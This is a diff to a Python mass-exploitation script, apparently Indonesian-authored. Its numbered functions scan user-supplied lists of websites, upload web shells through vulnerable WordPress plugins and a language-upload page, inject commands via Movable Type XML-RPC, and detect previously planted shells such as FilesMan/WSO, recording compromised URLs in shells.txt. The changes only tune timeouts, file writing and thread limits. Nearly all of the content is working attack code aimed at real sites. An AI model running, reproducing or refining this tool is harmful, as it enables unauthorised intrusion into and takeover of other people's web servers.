                 print ('[#] Exploit 147 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -3836,11 +3836,11 @@ mail($tujuanmail, "Hehehe", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]")
 </html>
 
 ------WebKitFormBoundary5bvq7vh5W2anjxf6--"""
-        che = requests.post(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/connectors/test.html',headers=headers,data=data,allow_redirects=True,timeout=15)
-        check = requests.get(url+'wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/connectors/x.php',headers=headers, allow_redirects=True,timeout=15)
+        che = requests.post(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/connectors/test.html',headers=headers,data=data,allow_redirects=True,timeout=5)
+        check = requests.get(url+'wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/connectors/x.php',headers=headers, allow_redirects=True,timeout=5)
         if ("mini shell by h0rn3t sp1d3rs" in check.content.decode("utf-8")):
                 print (' [#] Exploit 148 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + 'wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/connectors/x.php\n')
+                write_to_file('shells.txt', url + 'wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/connectors/x.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
@@ -3957,11 +3957,11 @@ mail($tujuanmail, "Hehehe", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]")
 </html>
 
 ------WebKitFormBoundary5bvq7vh5W2anjxf6--"""
-            che = requests.post(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/connectors/test.html',headers=headers,data=data,allow_redirects=True,timeout=15)
-            check = requests.get(url+'wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/connectors/x.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            che = requests.post(url+'/wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/connectors/test.html',headers=headers,data=data,allow_redirects=True,timeout=5)
+            check = requests.get(url+'wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/connectors/x.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if "mini shell by h0rn3t sp1d3rs" in check.content.decode("utf-8"):
                     print (' [#] Exploit 148 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + 'wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/connectors/x.php\n')
+                    write_to_file('shells.txt', url + 'wp-content/plugins/wp-super-edit/superedit/tinymce_plugins/mse/fckeditor/editor/filemanager/browser/default/connectors/x.php')
             else:
                 print ('[#] Exploit 148 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -3972,17 +3972,17 @@ def exploit_149(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp.php',headers=headers, allow_redirects=True,timeout=5)
         if ('FilesMan' in check.content.decode("utf-8")):
                 print (' [#] Exploit 149 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp.php\n')
+                write_to_file('shells.txt', url + '/wp.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'FilesMan' in check.content.decode("utf-8"):
                     print (' [#] Exploit 149 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp.php\n')
+                    write_to_file('shells.txt', url + '/wp.php')
             else:
                 print ('[#] Exploit 149 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -3993,17 +3993,17 @@ def exploit_150(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/ws.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/ws.php',headers=headers, allow_redirects=True,timeout=5)
         if ('FilesMan' in check.content.decode("utf-8")):
                 print (' [#] Exploit 150  --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/ws.php\n')
+                write_to_file('shells.txt', url + '/ws.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/ws.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/ws.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'FilesMan' in check.content.decode("utf-8"):
                     print (' [#] Exploit 150 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/ws.php\n')
+                    write_to_file('shells.txt', url + '/ws.php')
             else:
                 print ('[#] Exploit 150 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -4015,17 +4015,17 @@ def exploit_151(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-admin/zphxi.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-admin/zphxi.php',headers=headers, allow_redirects=True,timeout=5)
         if ('FilesMan' in check.content.decode("utf-8")):
                 print (' [#] Exploit 151 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-admin/zphxi.php\n')
+                write_to_file('shells.txt', url + '/wp-admin/zphxi.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-admin/zphxi.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-admin/zphxi.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'FilesMan' in check.content.decode("utf-8"):
                     print (' [#] Exploit 151 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-admin/zphxi.php\n')
+                    write_to_file('shells.txt', url + '/wp-admin/zphxi.php')
             else:
                 print ('[#] Exploit 151 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -4036,17 +4036,17 @@ def exploit_152(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-includes/shell20211028.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-includes/shell20211028.php',headers=headers, allow_redirects=True,timeout=5)
         if ('FilesMan' in check.content.decode("utf-8")):
                 print (' [#] Exploit 152 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-includes/shell20211028.php\n')
+                write_to_file('shells.txt', url + '/wp-includes/shell20211028.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-includes/shell20211028.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-includes/shell20211028.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'FilesMan' in check.content.decode("utf-8"):
                     print (' [#] Exploit 152 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-includes/shell20211028.php\n')
+                    write_to_file('shells.txt', url + '/wp-includes/shell20211028.php')
             else:
                 print ('[#] Exploit 152 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -4057,17 +4057,17 @@ def exploit_153(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/cgi-bin/wp-2019.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/cgi-bin/wp-2019.php',headers=headers, allow_redirects=True,timeout=5)
         if ('FilesMan' in check.content.decode("utf-8")):
                 print (' [#] Exploit 153 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/cgi-bin/wp-2019.php\n')
+                write_to_file('shells.txt', url + '/cgi-bin/wp-2019.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/cgi-bin/wp-2019.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/cgi-bin/wp-2019.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'FilesMan' in check.content.decode("utf-8"):
                     print (' [#] Exploit 153 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/cgi-bin/wp-2019.php\n')
+                    write_to_file('shells.txt', url + '/cgi-bin/wp-2019.php')
             else:
                 print ('[#] Exploit 153 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -4078,17 +4078,17 @@ def exploit_154(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-admin/wso112233.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-admin/wso112233.php',headers=headers, allow_redirects=True,timeout=5)
         if ('FilesMan' in check.content.decode("utf-8")):
                 print (' [#] Exploit 154 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-admin/wso112233.php\n')
+                write_to_file('shells.txt', url + '/wp-admin/wso112233.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-admin/wso112233.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-admin/wso112233.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'FilesMan' in check.content.decode("utf-8"):
                     print (' [#] Exploit 154 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-admin/wso112233.php\n')
+                    write_to_file('shells.txt', url + '/wp-admin/wso112233.php')
             else:
                 print ('[#] Exploit 154 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -4099,17 +4099,17 @@ def exploit_155(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/mt/pekok.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/mt/pekok.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Kirigaya Kirito' in check.content.decode("utf-8")):
                 print (' [#] Exploit 155 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/mt/pekok.php\n')
+                write_to_file('shells.txt', url + '/mt/pekok.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/mt/pekok.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/mt/pekok.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Kirigaya Kirito' in check.content.decode("utf-8"):
                     print (' [#] Exploit 155 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/mt/pekok.php\n')
+                    write_to_file('shells.txt', url + '/mt/pekok.php')
             else:
                 print ('[#] Exploit 155 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -4129,10 +4129,10 @@ def exploit_156(url):
         </base64></value></param>
         </params>
         </methodCall>"""
-        check = requests.post(url+'/mt/mt-xmlrpc.cgi', headers=headers, data=data, timeout=10, verify=False)
+        check = requests.post(url+'/mt/mt-xmlrpc.cgi', headers=headers, data=data, timeout=5, verify=False)
         if ("MT::handler_to_coderef('mt', '`echo" in check.content.decode("utf-8")):
                 print (' [#] Exploit 156 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/mt/mt-xmlrpc.cgi\n')
+                write_to_file('shells.txt', url + '/mt/mt-xmlrpc.cgi')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
@@ -4145,10 +4145,10 @@ def exploit_156(url):
         </base64></value></param>
         </params>
         </methodCall>"""
-            check = requests.post(url+'/mt/mt-xmlrpc.cgi', headers=headers, data=data, timeout=10, verify=False)
+            check = requests.post(url+'/mt/mt-xmlrpc.cgi', headers=headers, data=data, timeout=5, verify=False)
             if "MT::handler_to_coderef('mt', '`echo" in check.content.decode("utf-8"):
                     print (' [#] Exploit 156 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/mt/mt-xmlrpc.cgi\n')
+                    write_to_file('shells.txt', url + '/mt/mt-xmlrpc.cgi')
             else:
                 print ('[#] Exploit 156 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -4159,17 +4159,17 @@ def exploit_157(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/include/lang_upload.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/include/lang_upload.php',headers=headers, allow_redirects=True,timeout=5)
         if ( "<input type='submit' value='up' />" in check.content.decode("utf-8")):
                 print (' [#] Exploit 157 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/include/lang_upload.php\n')
+                write_to_file('shells.txt', url + '/include/lang_upload.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/include/lang_upload.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/include/lang_upload.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if "<input type='submit' value='up' />" in check.content.decode("utf-8"):
                     print (' [#] Exploit 157 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/include/lang_upload.php\n')
+                    write_to_file('shells.txt', url + '/include/lang_upload.php')
             else:
                 print ('[#] Exploit 157 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -4183,17 +4183,17 @@ def exploit_158(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',headers=headers, allow_redirects=True,timeout=5)
         if ('-= xxxxxxxxxxx =-' in check.content.decode("utf-8")):
                 print (' [#] Exploit 158 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php\n')
+                write_to_file('shells.txt', url + '/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '-= xxxxxxxxxxx =-' in check.content.decode("utf-8"):
                     print (' [#] Exploit 158 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php')
             else:
                 print ('[#] Exploit 158 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -4204,17 +4204,17 @@ def exploit_159(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/style.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/style.php',headers=headers, allow_redirects=True,timeout=5)
         if ('filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 159 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/style.php\n')
+                write_to_file('shells.txt', url + '/style.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/style.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/style.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 159 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/style.php\n')
+                    write_to_file('shells.txt', url + '/style.php')
             else:
                 print ('[#] Exploit 159 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -4225,17 +4225,17 @@ def exploit_160(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/mu-plugins/blog.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/mu-plugins/blog.php',headers=headers, allow_redirects=True,timeout=5)
         if ('0byt3m1n1' in check.content.decode("utf-8")):
                 print (' [#] Exploit 160 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/mu-plugins/blog.php\n')
+                write_to_file('shells.txt', url + '/wp-content/mu-plugins/blog.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/mu-plugins/blog.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/mu-plugins/blog.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if '0byt3m1n1' in check.content.decode("utf-8"):
                     print (' [#] Exploit 160 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/mu-plugins/blog.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/mu-plugins/blog.php')
             else:
                 print ('[#] Exploit 160 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -4251,7 +4251,7 @@ def exploit_161( url):
         if "New Language Uploaded Successfully" in r:
            print(f" [ LOG ] (SHELL UPLOADED) {url}")
         # self.Save("__shells__.txt", url.replace("include/lang_upload.php",f"languages/{name}"))
-           open('shells.txt', 'a').write(url + 'url.replace("include/lang_upload.php",f"languages/{name}")\n')
+           write_to_file('shells.txt', url + 'url.replace("include/lang_upload.php",f"languages/{name}")')
         
          
         else:
@@ -4261,7 +4261,7 @@ def exploit_161( url):
             if "New Language Uploaded Successfully" in r:
                 print(f" [ LOG ] (SHELL UPLOADED) {url}")
         # self.Save("__shells__.txt", url.replace("include/lang_upload.php",f"languages/{name}"))
-                open('shells.txt', 'a').write(url + 'url.replace("include/lang_upload.php",f"languages/{name}")\n')
+                write_to_file('shells.txt', url + 'url.replace("include/lang_upload.php",f"languages/{name}")')
         
             print(f" [ LOG ] (SHELL NOT UPLOADED) {url}")
     except:
@@ -4282,7 +4282,7 @@ def exploit_162(url):
             for path in paths:
                 try:
                     exploit_point = 'http://'+ url + path
-                    check = requests.get(exploit_point, verify=False,headers=headers,timeout=20).content
+                    check = requests.get(exploit_point, verify=False,headers=headers,timeout=5).content
                     if '<pre align=center><form method=post>Password<br><input type=password name=pass' in check:
                         try:
                             
@@ -4303,20 +4303,20 @@ def exploit_162(url):
                             fileup = {'f[]': (filename, shell_Fox)}
                             shell_path = exploit_point.replace(exploit_point.split('/')[-1],filename+'?Fox=DKBcL')
                             try :
-                                up = requp.post(exploit_point, data=filedata, files=fileup, headers=headersUp, timeout=30)
+                                up = requp.post(exploit_point, data=filedata, files=fileup, headers=headersUp, timeout=10)
                             except:
-                                up = requp.post(exploit_point, data=filedata, files=fileup, headers=headersUp, timeout=45)
+                                up = requp.post(exploit_point, data=filedata, files=fileup, headers=headersUp, timeout=15)
                             try :
-                                check = requests.get(shell_path, headers=headers, timeout=15)
+                                check = requests.get(shell_path, headers=headers, timeout=5)
                             except :
-                                check = requests.get(shell_path, headers=headers, timeout=30)
+                                check = requests.get(shell_path, headers=headers, timeout=5)
                             if 'UPload' in check.content and 'multipart/form-data' in check.content:
              
                                 print ('[#] Exploit 161 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                                open('shells.txt', 'a').write(shell_path +'\n')
+                                write_to_file('shells.txt', shell_path)
                             else:
                                     exploit_point = 'http://'+ url + path
-                                    check = requests.get(exploit_point, verify=False,headers=headers,timeout=20).content
+                                    check = requests.get(exploit_point, verify=False,headers=headers,timeout=5).content
                                     if '<pre align=center><form method=post>Password<br><input type=password name=pass' in check:
                                         try:
                             
@@ -4337,17 +4337,17 @@ def exploit_162(url):
                                             fileup = {'f[]': (filename, shell_Fox)}
                                             shell_path = exploit_point.replace(exploit_point.split('/')[-1],filename+'?Fox=DKBcL')
                                             try :
-                                                up = requp.post(exploit_point, data=filedata, files=fileup, headers=headersUp, timeout=30)
+                                                up = requp.post(exploit_point, data=filedata, files=fileup, headers=headersUp, timeout=10)
                                             except:
-                                                up = requp.post(exploit_point, data=filedata, files=fileup, headers=headersUp, timeout=45)
+                                                up = requp.post(exploit_point, data=filedata, files=fileup, headers=headersUp, timeout=15)
                                             try :
-                                                check = requests.get(shell_path, headers=headers, timeout=15)
+                                                check = requests.get(shell_path, headers=headers, timeout=5)
                                             except :
-                                                check = requests.get(shell_path, headers=headers, timeout=30)
+                                                check = requests.get(shell_path, headers=headers, timeout=5)
                                             if 'UPload' in check.content and 'multipart/form-data' in check.content:
              
                                                 print ('[#] Exploit 161 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                                                open('shells.txt', 'a').write(shell_path +'\n')
+                                                write_to_file('shells.txt', shell_path)
                                             else:
                                                 print(' -| ' + exploit_point + ' --> {}[Upload Fail]'.format(fr))
                                         except:
@@ -4389,9 +4389,13 @@ filename = input("\033[1;31mENTER FILE NAME: ")
 file = open(filename, encoding="utf-8").read().split()
 
 myfile = set(file)
+
+# Mendapatkan jumlah thread dari input pengguna dan membatasi maksimum thread
 thread = int(input("\033[1;31mThreads: "))
+max_thread = min(thread, 10)  # Batasi maksimal 10 thread
+
 
 # Membuat thread pool dengan maksimal 'thread' yang ditentukan
-with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
+with concurrent.futures.ThreadPoolExecutor(max_workers=max_thread) as executor:
     futures = [executor.submit(run_code, site) for site in myfile]
     concurrent.futures.wait(futures)
